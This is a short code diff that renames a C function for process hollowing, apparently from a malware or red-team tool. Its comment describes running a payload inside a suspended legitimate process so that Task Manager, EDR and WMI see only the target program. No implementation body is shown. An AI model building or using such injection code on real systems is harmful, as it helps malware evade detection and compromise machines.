@@ -2,7 +2,7 @@
 #include <windows.h>
 
 /*
- * jocky_hollow_inject
+ * dorm_hollow_inject
  * ====================
  * Spawns a suspended copy of `target_path`, unmaps its memory,
  * writes `payload` into the vacated address space, fixes the
@@ -21,7 +21,7 @@
  * The injected process inherits the identity of target_path —
  * Task Manager, EDR process trees, and WMI all see target_path.
  */
-BOOL jocky_hollow_inject(
+BOOL dorm_hollow_inject(
     LPCWSTR target_path,
     LPVOID  payload,
     SIZE_T  payload_size
